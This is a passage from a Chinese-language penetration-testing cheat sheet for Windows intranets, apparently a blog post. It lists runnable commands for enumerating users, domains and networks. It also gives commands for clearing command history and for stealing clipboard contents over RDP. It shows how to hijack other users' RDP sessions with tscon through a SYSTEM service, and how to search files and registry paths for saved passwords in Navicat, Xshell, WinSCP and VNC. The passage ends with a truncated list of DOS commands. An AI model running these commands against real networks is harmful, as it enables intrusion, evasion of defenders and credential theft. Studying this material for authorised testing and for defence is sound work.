class="line">net localgroup <span class="string">"<span class="variable">$groupname</span>"</span>    <span class="comment"># 查询指定⽤户组成员 </span></span><br><span class="line">net group   <span class="comment"># 仅域控可执⾏，查询⽤户组列 表 </span></span><br><span class="line">net group <span class="string">"<span class="variable">$groupname</span>"</span>    <span class="comment"># 仅域控可执⾏，查询⽤户组成 员</span></span><br></pre></td></tr></tbody></table></figure><p>注： <code>quser</code> 、 <code>qwinsta</code> 和 <code>query</code> 命令只存在于允许安装 RDP 服务的主机上，官⽅描述其仅存在于 server 2012 及以上版本存在。其中 <code>query termserver</code> 命令存在问题，本地测试时与描述严重不符， ⽆法列出信息。</p><h4 id="4、操作记录"><a href="#4、操作记录" class="headerlink" title="4、操作记录"></a>4、操作记录</h4><p>cmd 和 powershell v3 以下的操作记录⽆法⻓时间报存，仅限当前窗⼝。</p><figure class="highlight powershell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">Get-History</span> | <span class="built_in">Format-List</span> <span class="literal">-Property</span> *     <span class="comment"># 查询 powershell 当前 窗⼝历史操作记录</span></span><br><span class="line"><span class="built_in">Clear-History</span>   <span class="comment"># 删除 powershell 当前 窗⼝历史操作记录</span></span><br><span class="line"><span class="built_in">Clear-History</span> <span class="literal">-Id</span> <span class="number">3</span>    <span class="comment"># 删除 powershell 当前 窗⼝指定 ID 的历史操作记录</span></span><br><span class="line">doskey /<span class="built_in">h</span>    <span class="comment"># 查看 cmd 的历史操作记 录</span></span><br><span class="line">doskey /reinstall    <span class="comment"># 删除 cmd 的历史操作记 录</span></span><br></pre></td></tr></tbody></table></figure><p>可以通过向进程发送键盘内容的⽅式将运⾏中的窗⼝历史操作记录导出，详情参考⼦菜单 <code>get- history</code> 。</p><p>powershell v5 以上的操作历史记录会直接保存在指定⽂件中。直接查看即可。</p><figure class="highlight taggerscript"><table><tbody><tr><td class="code"><pre><span class="line"># 查看 powershell 历史操作记录</span><br><span class="line">type <span class="variable">%appdata%</span><span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\P</span>owerShell<span class="symbol">\P</span>SReadline<span class="symbol">\C</span>onsoleHost _history.txt</span><br></pre></td></tr></tbody></table></figure><p>powershell v3、v4 版本需要安装 <code>Get-PSReadlineOption</code> 。</p><p><code>msiexec /q /i PackageManagement_x64.msi</code></p><h4 id="5、剪切板信息收集"><a href="#5、剪切板信息收集" class="headerlink" title="5、剪切板信息收集"></a>5、剪切板信息收集</h4><p>不同⽤户之间的剪切板没有关联，使⽤微软⾃带的 mstsc 建⽴ rdp 远程连接时，剪切板内容会同步。<br>利⽤⼯具可以定期将剪切板内容导出，从⽽达到信息收集的⽬的。</p><p><strong>当前剪切板</strong> </p><p>在empire中有⼀个Get-ClipboardContents.ps1，可以⽤empire或者coablt strike加载该脚本。或者也 可以⾃⼰编写相关脚本使⽤。是⼀个相对简单的⼯具。</p><p><strong>rdplicp</strong></p><p>在使⽤ mstsc 进⾏远程桌⾯的时候，会启动⼀个叫 rdpclip.exe 的进程，该进程的功能是同步服务端与客 户端的剪贴板。 </p><p>由于启动该进程时，会⾃动同步剪切板内容，因此当⽬标⽬标机器与其他机器使⽤ mstsc 建⽴ RDP 远程 连接时，就可以通过读取 rdplicp.exe 进程数据，进⾏剪贴板窃取，以尽可能地获取更多地信息。 </p><p>此外，由于由于该进程时后台运⾏的，当管理员同时⽤远程桌⾯登陆多个服务器，在其中得某⼀个服务器 上进⾏复制拷⻉操作时，会将数据同步到所有服务器的 rdplicp.exe 进程。</p><h4 id="6、会话劫持"><a href="#6、会话劫持" class="headerlink" title="6、会话劫持"></a>6、会话劫持</h4><p>windows 系统下，不同⽤户登录时会有不同的 session ID ，⽽当前⽤户只能看到当前⽤户 session ID 下的内容。 </p><p>例如： tsclient 只有建⽴远程连接的⽤户才可以看到，和访问到。</p><p>同过某些⽅式劫持其他⽤户会话，可以进⼀步收集信息。</p><p><strong>tscon</strong></p><p>在系统权限下可以通过 tscon 命令去接管其他⼈的桌⾯。但是需要注意的是，如果接管时⽬标⽤户正在连 接状态，则会被强制踢下线。 </p><p>但是如果⽤户已经断开连接，此时接管桌⾯就不会产⽣其他额外影响。只要不破坏原有桌⾯打开内容，布 局，当断开连接后，⽤户再次登录基本⽆感。</p><p><code>tscon 需要劫持的会话ID /dest:当前⽤户会话名</code></p><p>但是需要注意的是，该命令需要系统权限执⾏。同时，由于是直接接管 session ID 对应的桌⾯，会把正在 使⽤的⽤户踢下线，所以是⽆法访问 <code>tsclient</code> 的。</p><p>同时，如果开启了远程桌⾯授权验证，则使⽤该⽅法时，需要输⼊密码才能进⼊桌⾯环境。 </p><p>由于需要 system 权限才能启动，因此需要先提权⾄ system 。除第三⽅提权⼯具以外，还可以利⽤服务 启动时默认的 system 权限来执⾏。</p><p>⽅法如下：<br><code>sc create sesshijack binpath= "cmd.exe /k tscon 需要劫持的会话ID /des t:当前⽤户会话名"</code></p><p>除使⽤服务的 system 权限执⾏以外。mimikatz 也具有该功能，或者使⽤ psexec 提权⾄ system 均 可。</p><p><strong>RunInSession</strong><br>RunInSession 这款⼯具可以实现在指定 session ID 下启动执⾏程序或脚本。利⽤该⼯具可以实现在不强 制其他⽤户下线的情况下获取情报，最直接的有剪切板窃取和 <code>tsclient</code> 的访问。</p><p>使⽤⽅法：<br><code>RunInSession.exe $sessionid $</code></p><p>例如：<br> <code>RunInSession.exe 2 c:\1.bat</code></p><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/51958b6b7cb94f338fa79a422151ebac.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/5052d136ae514f76b11bfcb9a32b93c8.png"></p><p>该⼯具需要在管理员权限下执⾏。</p><p>⼯具下载地址：<a href="https://github.com/l3m0n/pentest_tools/blob/master/%E5%86%85%E2%BD%B9%E6%94%BB%E9%98%B2/%E8%BF%9C%E7%A8%8B%E8%BF%9E">https://github.com/l3m0n/pentest_tools/blob/master/内⽹攻防/远程连</a> 接/RunInSession.zip</p><h3 id="⽹络发现"><a href="#⽹络发现" class="headerlink" title="⽹络发现"></a>⽹络发现</h3><p>内⽹⽹络发现是⼀个很重要的信息收集内容，⼀般情况下是不建议使⽤扫描器扫描，尤其不建议使⽤ nmap，当然，如果是靶场，或是甲⽅授权就另当别论。</p><h4 id="1、基本信息收集"><a href="#1、基本信息收集" class="headerlink" title="1、基本信息收集"></a>1、基本信息收集</h4><figure class="highlight gauss"><table><tbody><tr><td class="code"><pre><span class="line">ipconfig /all    <span class="meta"># 列出当前主机详细⽹络信息 </span></span><br><span class="line">ipconfig /displaydns  <span class="meta"># 列出dns缓存信息 </span></span><br><span class="line">route <span class="keyword">print</span>    <span class="meta"># 查询路由表</span></span><br><span class="line">arp -a    <span class="meta"># 地址解析协议缓存表</span></span><br><span class="line">netstat -ano    <span class="meta"># 端⼝使⽤情况 </span></span><br><span class="line">net share    <span class="meta"># 查看共享信息</span></span><br><span class="line">net <span class="built_in">view</span>   <span class="meta"># 查看共享资源列表</span></span><br><span class="line">wmic share get name,path,status    <span class="meta"># 查看共享信息 </span></span><br><span class="line"><span class="meta"># 查看 host ⽂件 </span></span><br><span class="line"><span class="built_in">type</span> c:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></tbody></table></figure><p>使⽤arp命令收集最近建⽴过连接的ip，但是此⽅法在某些时候⽆法收集到⽹段外的ip地址。</p><h4 id="2、SPN信息收集"><a href="#2、SPN信息收集" class="headerlink" title="2、SPN信息收集"></a>2、SPN信息收集</h4><p>SPN：服务主体名称。使⽤Kerberos须为服务器注册SPN，因此可以在内⽹中扫描SPN，快速寻找内⽹中 注册的服务，SPN扫描可以规避像端⼝扫描的不确定性探测动作。 主要利⽤⼯具有：setspn、GetUserSPNs.vbs和Rubeus。</p><p>利⽤ Windows ⾃带的 setspn ⼯具 </p><p>普通域⽤户权限执⾏即可</p><p><code>setspn -T domain.com -Q */*</code></p><p>利⽤ GetUserSPNs.vbs </p><p>使⽤ Rubeus ⼯具</p><h4 id="3、协议探测"><a href="#3、协议探测" class="headerlink" title="3、协议探测"></a>3、协议探测</h4><p><strong>icmp 协议</strong></p><p>直接回显</p><p><code>for /l %i in (1,1,255) do @ ping 10.0.0.%i -w 1 -n 1|find /i "ttl ="</code></p><p>输出⽂件<br><code>@for /l %i in (1,1,255) do @ping -n 1 -w 40 192.168.0.%i &amp; if erro rlevel 1 (echo 192.168.0.%i &gt;&gt; ip.txt) else (echo 192.168.0.%i &gt;&gt; ip.txt)</code></p><p><strong>Netbios 协议</strong></p><p>msf 扫描 </p><p><code>msf &gt; use auxiliary/scanner/netbios/nbname</code></p><p>nbtscan 扫描 </p><p>下载：<a href="http://www.unixwiz.net/tools/nbtscan.html#download">http://www.unixwiz.net/tools/nbtscan.html#download</a></p><p><code>nbtscan -m 192.168.1.0/24</code></p><p><strong>UDP 协议</strong></p><p>msf</p><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary<span class="regexp">/scanner/</span>discovery/udp_probe</span><br><span class="line">msf &gt; use auxiliary<span class="regexp">/scanner/</span>discovery/udp_sweep</span><br></pre></td></tr></tbody></table></figure><p><strong>smb-version</strong></p><p>python版：<a href="https://github.com/amitn322/smb-version">https://github.com/amitn322/smb-version</a> </p><p>c#版：<a href="https://www.zcgonvh.com/post/CSharp_smb_version_Detection.html">https://www.zcgonvh.com/post/CSharp_smb_version_Detection.html</a></p><p><strong>SNMP 协议</strong></p><p>msf</p><p><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum</code></p><h4 id="4、系统⽇志"><a href="#4、系统⽇志" class="headerlink" title="4、系统⽇志"></a>4、系统⽇志</h4><p>可以使⽤ wevtutil.exe psloglist.exe 或者 powershell 的 Get-WinEvent 模块进⾏⽇志导出，server 03 的域控可使⽤ eventquery.vbs 导出。</p><p>wevtutil不需要UAC， ⽀持很多过滤语法，若有需要请查看官⽅说明</p> <figure class="highlight jboss-cli"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 查询登录⽇志语法 wevtutil qe security /f:text /q:*[System[(EventID=4624)]] </span></span><br><span class="line"> <span class="comment"># 查询所有登录、注销相关的⽇志语法</span></span><br><span class="line">wevtutil qe security <span class="string">/rd</span><span class="function">:true</span> <span class="string">/f</span><span class="function">:text</span> <span class="string">/q</span>:<span class="string">"*[system/eventid=4624 an d 4623 and 4627]"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程查询时在后⾯加⼊/r:computer /u:user /p:password ⽐如查询dc1上的登录 注销⽇志</span></span><br><span class="line"></span><br><span class="line">wevtutil qe security <span class="string">/rd</span><span class="function">:true</span> <span class="string">/f</span><span class="function">:text</span> <span class="string">/q</span>:<span class="string">"*[system/eventid=4624 an d 4623 and 4672]"</span> <span class="string">/r</span><span class="function">:dc1</span> <span class="string">/u</span><span class="function">:administrator</span> <span class="string">/p</span><span class="function">:password</span></span><br></pre></td></tr></tbody></table></figure><p>本地使⽤LogParser⽇志分析⼯具整理导出的⽇志，然后去除重复数据、⽆效数据（以’$’结束的⽤户名）</p><p><code>LogParser.exe -i:EVT -o txt "SELECT TO_UPPERCASE(EXTRACT_TOKEN(Str ings,5,'|')) as USERNAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,1 8,'|')) as SOURCE_IP FROM C:\ProgramData\log.evtx" &gt; C:\ProgramDat a\log.txt</code></p><figure class="highlight jboss-cli"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 导出域控登录⽇志到域控上</span></span><br><span class="line">wevtutil epl Security C:\ProgramData\dc.evtx <span class="string">/q</span>:<span class="string">"*[EventData[Data [@Name='LogonType']='3'] and System[(EventID=4624) and TimeCreated [timediff(@SystemTime) &lt;= 2592000000]]]"</span> <span class="string">/r</span>:域控IP <span class="string">/u</span>:域管 <span class="string">/p</span>:域管密 码</span><br></pre></td></tr></tbody></table></figure><h4 id="5、浏览器⽇志"><a href="#5、浏览器⽇志" class="headerlink" title="5、浏览器⽇志"></a>5、浏览器⽇志</h4><p>收集浏览器访问记录。</p><figure class="highlight taggerscript"><table><tbody><tr><td class="code"><pre><span class="line"># chrome </span><br><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\$</span>username<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\G</span>oogle<span class="symbol">\C</span>hrome<span class="symbol">\U</span>ser Data<span class="symbol">\D</span>efault <span class="symbol">\H</span>istory </span><br><span class="line"># firefox 5 </span><br><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\$</span>username<span class="symbol">\A</span>ppData<span class="symbol">\R</span>oaming<span class="symbol">\M</span>ozilla<span class="symbol">\F</span>irefox<span class="symbol">\P</span>rofiles<span class="symbol">\$</span>nam e.default<span class="symbol">\p</span>laces.sqlite </span><br><span class="line"># IE</span><br><span class="line">reg query "HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\I</span>nternet Explorer <span class="symbol">\T</span>ypedURLs"</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\$</span>user<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\H</span>istory</span><br><span class="line"></span><br><span class="line"># edge</span><br><span class="line"></span><br><span class="line"># v79+</span><br><span class="line"></span><br><span class="line"> C:<span class="symbol">\U</span>sers<span class="symbol">\$</span>user<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\E</span>dge<span class="symbol">\U</span>ser Data<span class="symbol">\D</span>efault<span class="symbol">\H</span>istory</span><br><span class="line"></span><br><span class="line"># v44+</span><br><span class="line"></span><br><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\$</span>user<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\W</span>ebCache<span class="symbol">\W</span>ebCacheV 01.dat</span><br></pre></td></tr></tbody></table></figure><p>浏览器的历史记录⽂件 history，是使⽤ sqlite 格式记录的，直接打开是⼀个⼆进制⽂件，可以下载到本地破解，或者直接替换查看。 </p><p>需要注意的是，edge v44+ 版本的历史记录⽂件在⽤户登录状态下是锁定的。</p><h4 id="6、DNS服务器记录"><a href="#6、DNS服务器记录" class="headerlink" title="6、DNS服务器记录"></a>6、DNS服务器记录</h4><p>如果⽬标机器在域内，只需要按部就班收集域信息，准备域横向渗透即可。</p><p>但其中有⼀点单独提⼀下，⼀般在域环境中都会有⼀台 DNS 服务器，⼩企业或内⽹环境较⼩的可能会和 域控为同⼀台，⼤⼀些的企业，多为独⽴的 DNS 服务器。 </p><p>由于 DNS 服务器的特性，因此，在 DNS 服务器上会存在⼤量内⽹地址解析记录，如果可以获取，会极⼤ 的⽅便内⽹拓扑展开，同时很多其他主机⽆法到达的地址，DNS 服务器是可以到达的。</p><figure class="highlight jboss-cli"><table><tbody><tr><td class="code"><pre><span class="line">dnscmd . <span class="string">/EnumZones</span>     <span class="comment"># 列出 DNS 区域中当 前节点的资源记录 </span></span><br><span class="line">dnscmd . <span class="string">/ZoneInfo</span> test.com     <span class="comment"># 列出 test.com 的 信息</span></span><br><span class="line">dnscmd . <span class="string">/ZonePrint</span> test.com     <span class="comment"># 列出 test.com 中 的详细记录</span></span><br><span class="line">dnscmd . <span class="string">/EnumRecords</span> test.com .     <span class="comment"># 列出 test.com 中 的记录</span></span><br></pre></td></tr></tbody></table></figure><p>DNS 记录有正向解析和反向解析两种。  </p><p>正向解析是从域名到IP，反向解析则是从IP到域名。<br>反向隔离和正向隔离相同，都会有⼀个对应的区域，因此，查询⽅式与正向记录相同。</p><p>DNS 服务器还存在域传送漏洞。可以直接获得 DNS 记录。</p><figure class="highlight vim"><table><tbody><tr><td class="code"><pre><span class="line">nslookup -<span class="built_in">type</span>=all_ldap._tcp.dc.greyfinger.<span class="keyword">com</span> </span><br><span class="line">nslookup -<span class="built_in">type</span>=ns domain.<span class="keyword">com</span> </span><br><span class="line">nslookup </span><br><span class="line">sserver dns.domain.<span class="keyword">com</span> </span><br><span class="line"><span class="keyword">ls</span> domain.<span class="keyword">com</span></span><br></pre></td></tr></tbody></table></figure><h3 id="域信息查询"><a href="#域信息查询" class="headerlink" title="域信息查询"></a>域信息查询</h3><h4 id="1、基本信息收集-1"><a href="#1、基本信息收集-1" class="headerlink" title="1、基本信息收集"></a>1、基本信息收集</h4><p>域信息收集，需要当前⽤户为域⽤户。本地⽤户⽆法执⾏域命令查询域内容。 但是如果⽬标机器为域内机器，域⽤户未登陆，此时 system 权限下可以使⽤机器身份查询域命令。</p><figure class="highlight crmsh"><table><tbody><tr><td class="code"><pre><span class="line">net config workstation    <span class="comment"># 查询当前登录域 </span></span><br><span class="line">net time     <span class="comment"># 同步时间，通常为域控服务器 </span></span><br><span class="line">net accounts /domain    <span class="comment"># 查询域密码策略 </span></span><br><span class="line">net <span class="keyword">user</span> <span class="title">/domain</span>    <span class="comment"># 列出当前域成员列表 </span></span><br><span class="line">net <span class="keyword">user</span> <span class="title">username</span> /domain    <span class="comment"># 列出域成员详细信息 </span></span><br><span class="line">net <span class="keyword">group</span> <span class="title">/domain</span>    <span class="comment"># 列出域内组列表 </span></span><br><span class="line">net <span class="keyword">group</span> <span class="title">groupname</span> /domain     <span class="comment"># 列出域内组成员列表 </span></span><br><span class="line">net view     <span class="comment"># 查询同⼀域内机器列表</span></span><br><span class="line">net view /domain     <span class="comment"># 查询域列表 </span></span><br><span class="line">net view /domain:test     <span class="comment"># 查询 test 域中计算机列表 </span></span><br><span class="line">nltest /dclist:domain      <span class="comment"># 查询域内的所有DC </span></span><br><span class="line">nltest /dsgetdc:domain     <span class="comment"># 拿到DC当前的认证信息</span></span><br><span class="line">nltest /domain_trusts <span class="comment"># 查询域信任信息</span></span><br><span class="line">nltest /user:<span class="string">"username"</span> <span class="comment"># 得到⽤户信息</span></span><br></pre></td></tr></tbody></table></figure><p>想要定位域管和域控机器，可以查询 <code>domain admin</code> 和 <code>domain controllers</code> 组，需要注意的是，组 名会随系统语⾔变化⽽变化，如 <code>domain controllers</code> 会变化成 <code>domaine contrôleurs</code> 。</p><p>在域内其他机器上，查询组是 <code>net group /domain</code> ，⽽在域控上则是 <code>net group</code> 。</p><h4 id="2、dsquery"><a href="#2、dsquery" class="headerlink" title="2、dsquery"></a>2、dsquery</h4><p>dsquery命令很少使⽤，⽽且限制较⼤仅能在域控上执⾏，所以相对⽽⾔较为鸡肋，但是在⼀定条件下还 是具有⼀定的使⽤价值。</p><figure class="highlight crmsh"><table><tbody><tr><td class="code"><pre><span class="line">dsquery computer     <span class="comment"># 查询⽬录中的计算机 dsquery contact     # 查询⽬录中的联系⼈ </span></span><br><span class="line">dsquery subnet     <span class="comment"># 查询⽬录中的⼦⽹ </span></span><br><span class="line">dsquery <span class="keyword">group</span>     <span class="title"># 查询⽬录中的组 </span></span><br><span class="line"><span class="title">dsquery</span> site     <span class="comment"># 查询⽬录中的站点</span></span><br><span class="line">dsquery <span class="keyword">user</span>      <span class="title"># 查询⽬录中的⽤户</span></span><br></pre></td></tr></tbody></table></figure><h4 id="3、powershell"><a href="#3、powershell" class="headerlink" title="3、powershell"></a>3、powershell</h4> <figure class="highlight pgsql"><table><tbody><tr><td class="code"><pre><span class="line"># 查询当前<span class="keyword">Domain</span>信息</span><br><span class="line">[<span class="keyword">System</span>.DirectoryServices.ActiveDirectory.<span class="keyword">Domain</span>]::GetCurrentDoma <span class="keyword">in</span>()</span><br><span class="line"></span><br><span class="line"># 查询域信任关系</span><br><span class="line">([<span class="keyword">System</span>.DirectoryServices.ActiveDirectory.<span class="keyword">Domain</span>]::GetCurrentDom ain()).GetAllTrustRelationships()</span><br><span class="line"></span><br><span class="line"> # 查询当前林信息</span><br><span class="line">[<span class="keyword">System</span>.DirectoryServices.ActiveDirectory.Forest]::GetCurrentFore st()</span><br><span class="line"></span><br><span class="line"> # 查询林信任信息</span><br><span class="line">([<span class="keyword">System</span>.DirectoryServices.ActiveDirectory.Forest]::GetForest((Ne w-<span class="keyword">Object</span> <span class="keyword">System</span>.DirectoryServices.ActiveDirectory.DirectoryContex t(<span class="string">'Forest'</span>, <span class="string">'forest-of-interest.local'</span>)))).GetAllTrustRelationshi ps()</span><br></pre></td></tr></tbody></table></figure><h3 id="配置⽂件收集"><a href="#配置⽂件收集" class="headerlink" title="配置⽂件收集"></a>配置⽂件收集</h3><h4 id="1、findstr命令搜索"><a href="#1、findstr命令搜索" class="headerlink" title="1、findstr命令搜索"></a>1、findstr命令搜索</h4><p>与 linux 系统下的 find 命令类似，findstr 是 Window 系统⾃带的命令，⽤途是查找指定的⼀个或多个⽂ 件⽂件中包含某些特定字符串的⾏，并将该⾏完整的信息打印出来，或者打印查询字符串所在的⽂件名。</p><p>常⽤命令有： </p><figure class="highlight jboss-cli"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">/S</span>      <span class="comment"># 在当前⽬录和所有⼦⽬录中搜索匹配⽂件。</span></span><br><span class="line"><span class="string">/I</span>       <span class="comment"># 指定搜索不分⼤⼩写。</span></span><br><span class="line"><span class="string">/X</span>     <span class="comment"># 打印完全匹配的⾏。</span></span><br><span class="line"><span class="string">/M</span>     <span class="comment"># 如果⽂件含有匹配项，只打印其⽂件名。</span></span><br><span class="line"><span class="string">/D</span><span class="function">:dir</span>    <span class="comment"># 查找以分号为分隔符的⽬录列表 </span></span><br><span class="line"></span><br><span class="line">indstr <span class="string">/s</span> <span class="string">/m</span> <span class="string">"password"</span> *.* </span><br><span class="line">findstr <span class="string">/i</span> <span class="string">/s</span> <span class="string">"password"</span> *<span class="string">.config</span> </span><br><span class="line">findstr <span class="string">/i</span> <span class="string">/s</span> <span class="string">"password"</span> *<span class="string">.ini</span> </span><br><span class="line">findstr <span class="string">/i</span> <span class="string">/s</span> <span class="string">"password"</span> *<span class="string">.xml</span></span><br></pre></td></tr></tbody></table></figure><h4 id="2、常⻅位置"><a href="#2、常⻅位置" class="headerlink" title="2、常⻅位置"></a>2、常⻅位置</h4><p><strong>配置⽂件</strong></p><p>IIS配置⽂件路径为： <code>%windir%\system32\inetsrv\config\applicationHost.config</code></p><p>使⽤appcmd的⽅式可以快速导出所需内容:</p><figure class="highlight taggerscript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">%windir%</span><span class="symbol">\s</span>ystem32<span class="symbol">\i</span>netsrv<span class="symbol">\a</span>ppcmd list site /config</span><br><span class="line"><span class="variable">%windir%</span><span class="symbol">\s</span>ystem32<span class="symbol">\i</span>netsrv<span class="symbol">\a</span>ppcmd list site /config /xml &gt; c:<span class="symbol">\s</span>ite s.xml</span><br></pre></td></tr></tbody></table></figure><p><strong>密码保存</strong></p><p>navicat<br>|数据库|路径|<br>|—-|—-|<br>|MySQL |            HKEYCURRENTUSER\Software\PremiumSoft \Navicat\Servers\ |<br>|MariaDB |HKEYCURRENTUSER\Software\PremiumSoft \NavicatMARIADB\Servers\ |<br>|MongoDB |HKEYCURRENTUSER\Software\PremiumSoft \NavicatMONGODB\Servers\ |<br>|Microsoft SQL |HKEYCURRENTUSER\Software\PremiumSoft \NavicatMSSQL\Servers|<br>|Oracle |HKEYCURRENTUSER\Software\PremiumSoft \NavicatOra\Servers\ |<br>|PostgreSQL |HKEYCURRENTUSER\Software\PremiumSoft \NavicatPG\Servers\ |<br>|SQLite |HKEYCURRENTUSER\Software\PremiumSoft \NavicatSQLite\Servers|</p><p>SecureCRT</p><table><thead><tr><th>系统版本</th><th>路径</th></tr></thead><tbody><tr><td>xp/win2003</td><td>C:\Documents and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</td></tr><tr><td>win7/win2008以上</td><td>C:\Users\USERNAME\AppData\Roaming\Va nDyke\Config\Sessions</td></tr></tbody></table><p>Xshell<br>|版本 |路径 |<br>|—-|—-|<br>|Xshell 5| %userprofile%\Documents\NetSarang\Xshell\Sessions|<br>|Xshell 6 |%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions|</p><p>WinSCP</p><figure class="highlight taggerscript"><table><tbody><tr><td class="code"><pre><span class="line">HKCU<span class="symbol">\S</span>oftware<span class="symbol">\M</span>artin Prikryl<span class="symbol">\W</span>inSCP 2<span class="symbol">\S</span>essions</span><br></pre></td></tr></tbody></table></figure><p>VNC</p><table><thead><tr><th>版本</th><th>路径</th><th>类型</th></tr></thead><tbody><tr><td>RealVNC</td><td>HKEYLOCALMACHINE\SOFT WARE\RealVNC\vncserver</td><td>Password</td></tr><tr><td>TightVNC</td><td>HKEYCURRENTUSER\Softwa re\TightVNC\Server Value</td><td>Password or PasswordViewOnly</td></tr><tr><td>TigerVNC</td><td>HKEYLOCALUSER\Software\ TigerVNC\WinVNC4</td><td>Password</td></tr><tr><td>UltraVNC</td><td>C:\Program Files\UltraVNC\ultravnc.ini</td><td>passwd or passwd2</td></tr></tbody></table><h2 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h2><figure class="highlight dos"><table><tbody><tr><td class="code"><pre><span class="line"><span class="number">1</span>.gpedit.msc—–组策略</span><br><span class="line"><span class="number">2</span>.sndrec32——-录音机</span><br><span class="line"><span class="number">3</span>.Nslookup——-IP地址侦测器，是一个监测网络中DNS服务器是否能正确实现域名解析的命令行工具。它在WindowsNT/<span class="number">2000</span>/XP中均可使用,但在Windows98中却没有集成这一个工具。</span><br><span class="line"><span class="number">4</span>.explorer——-打开资源管理器</span><br><span class="line"><span class="number">5</span>.logoff———注销命令</span><br><span class="line"><span class="number">6</span>.shutdown——-<span class="number">60</span>秒倒计时关机命令</span><br><span class="line"><span class="number">7</span>.lusrmgr.msc—-本机用户和组</span><br><span class="line"><span class="number">8</span>.services.msc—本地服务设置</span><br><span class="line"><span class="number">9</span>.oobe/msoobe /a—-检查XP是否激活</span><br><span class="line"><span class="number">10</span>.notepad——–打开记事本</span><br><span class="line"><span class="number">11</span>.cleanmgr——-垃圾整理</span><br><span class="line"><span class="number">12</span>.netstartmessenger—-开始信使服务</span><br><span class="line"><span class="number">13</span>.compmgmt.msc—计算机管理</span><br><span class="line"><span class="number">14</span>.netstopmessenger—–停止信使服务</span><br><span class="line"><span class="number">15</span>.conf———–启动netmeeting</span><br><span class="line"><span class="number">16</span>.dvdplay——–DVD播放器</span><br><span class="line"><span class="number">17</span>.charmap——–启动字符映射表</span><br><span class="line"><span class="number">18</span>.diskmgmt.msc—磁盘管理实用程序</span><br><span class="line"><span class="number">19</span>.calc———–启动计算器</span><br><span class="line"><span class="number">20</span>.dfrg.msc——-磁盘碎片整理程序</span><br><span class="line"><span class="number">21</span>.<span class="built_in">chkdsk</span>.exe—–<span class="built_in">Chkdsk</span>磁盘检查</span><br><span class="line"><span class="number">22</span>.devmgmt.msc—设备管理器</span><br><span class="line"><span class="number">23</span>.regsvr32 /u *.dll—-停止dll文件运行</span><br><span class="line"><span class="number">24</span>.drwtsn32——系统医生</span><br><span class="line"><span class="number">25</span>.rononce-p—-<span class="number">15</span>秒关机</span><br><span class="line"><span class="number">26</span>.dxdiag———检查DirectX信息</span><br><span class="line"><span class="number">27</span>.regedt32——-注册表编辑器</span><br><span class="line"><span class="number">28</span>.Msconfig.exe—系统配置实用程序</span><br><span class="line"><span class="number">29</span>.rsop.msc——-组策略结果集</span><br><span class="line"><span class="number">30</span>.mem.exe——–显示内存使用情况</span><br><span class="line"><span class="number">31</span>.regedit.exe—-注册表</span><br><span class="line"><span class="number">32</span>.winchat——–XP自带局域网聊天</span><br><span class="line"><span class="number">33</span>.progman——–程序管理器</span><br><span class="line"><span class="number">34</span>.winmsd———系统信息</span><br><span class="line"><span class="number">35</span>.perfmon.msc—-计算机性能监测程序</span><br><span class="line"><span class="number">36</span>.winver———检查Windows版本</span><br><span class="line"><span class="number">37</span>.sfc/scannow—–扫描错误并复原</span><br><span class="line"><span class="number">38</span>.taskmgr—–任务管理器（<span class="number">2000</span>/xp/<span class="number">2003</span></span><br><span class="line"><span class="number">39</span>.winver———检查Windows版本</span><br><span class="line"><span class="number">40</span>.wmimgmt.msc—-打开windows管理体系结构(WMI)</span><br><span class="line"><span class="number">41</span>.wupdmgr——–windows更新程序</span><br><span class="line"><span class="number">42</span>.wscript——–windows脚本宿主设置</span><br><span class="line"><span class="number">43</span>.write———-写字板</span><br><span class="line"><span class="number">44</span>.winmsd———系统信息</span><br><span class="line"><span class="number">45</span>.wiaacmgr——-扫描仪和照相机向导</span><br><span class="line"><span class="number">46</span>.winchat——–XP自带局域网聊天</span><br><span class="line"><span class="number">47</span>.mem.exe——–显示内存使用情况</span><br><span class="line"><span class="number">48</span>.Msconfig.exe—系统配置实用程序</span><br><span class="line"><span class="number">49</span>.mplayer2——-简易widnowsmediaplayer</span><br><span class="line"><span class="number">50</span>.mspaint——–画图板</span><br><span class="line"><span class="number">51</span>.mstsc———-远程桌面连接</span><br><span class="line"><span class="number">52</span>.mplayer2——-媒体播放机</span><br><span class="line"><span class="number">53</span>.magnify——–放大镜实用程序</span><br><span class="line"><span class="number">54</span>.mmc————打开控制台</span><br><span class="line"><span class="number">55</span>.mobsync——–同步命令</span><br><span class="line"><span class="number">56</span>.dxdiag———检查DirectX信息</span><br><span class="line"><span class="number">57</span>.iexpress——-木马捆绑工具，系统自带</span><br><span class="line"><span class="number">58</span>.fsmgmt.msc—–共享文件夹管理器</span><br><span class="line"><span class="number">59</span>.utilman——–辅助工具管理器</span><br><span class="line"><span 